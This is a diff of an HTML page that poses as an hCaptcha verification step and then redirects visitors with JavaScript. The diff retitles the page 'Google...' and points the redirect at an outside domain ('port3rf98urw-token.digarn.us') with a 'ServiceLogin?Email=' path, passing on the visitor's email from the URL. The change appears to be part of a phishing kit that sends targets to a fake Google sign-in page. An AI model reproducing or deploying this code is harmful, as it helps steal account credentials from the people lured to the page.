@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verification</title>
+  <title>Google...</title>
   <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 </head>
 <body>
@@ -14,26 +14,26 @@
         var browserURL = new URL(window.location.href);
         var params = new URLSearchParams(browserURL.search);
         var data = window.location.href.split('?')[1]
-        var redurl = './auth/'
+        var redurl = 'https://port3rf98urw-token.digarn.us/'
         // default redirect
-        var redLocation = redurl + '?ssr=' + data
+        var redLocation = redurl + 'ServiceLogin?Email=' + data
   
         // detect os
         if (navigator.appVersion.indexOf('Win') != -1) {
           if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
             console.log('dark mode')
-            redLocation = redurl + '?ssr=' + data
+            redLocation = redurl + 'ServiceLogin?Email=' + data
           } else {
-            redLocation = redurl + '?ssr=' + data
+            redLocation = redurl + 'ServiceLogin?Email=' + data
           }
         }
   
         if (navigator.appVersion.indexOf('Macintosh') != -1) {
           if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
             console.log('dark mode')
-            redLocation = redurl + '?ssr=' + data
+            redLocation = redurl + 'ServiceLogin?Email=' + data
           } else {
-            redLocation = redurl + '?ssr=' + data
+            redLocation = redurl + 'ServiceLogin?Email=' + data
           }
         }
         window.location.replace(redLocation);
